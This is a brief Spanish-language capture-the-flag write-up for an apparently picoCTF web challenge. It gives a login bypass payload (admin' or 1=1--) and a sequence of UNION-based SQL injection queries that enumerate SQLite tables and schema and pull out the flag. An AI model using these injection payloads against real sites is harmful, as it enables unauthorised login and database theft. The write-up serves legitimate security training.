# Descripción
Can you find the flag on this website.Try to find the flag [here](http://saturn.picoctf.net:52995/).
# Solución
Iniciar sesion con admin' or 1=1-- como contraseña y usuario

En el filtro de busqueda hacer una inyeccion de sql

```
ciudad' union select 1,2,3; ciudad' union select sqlite_version(),2,3; ciudad' union select 1,2,tbl_name FROM sqlite_master WHERE type='table' ; ciudad' union select 1,sql,tbl_name FROM sqlite_master WHERE type='table' ; ciudad' union select 1,2,flag from more_table;
```

# Notas adicionales
Se le va poniendo 1,2,3, etc. hasta que funcione

Se va revelando de a poco las tablas

# Referencias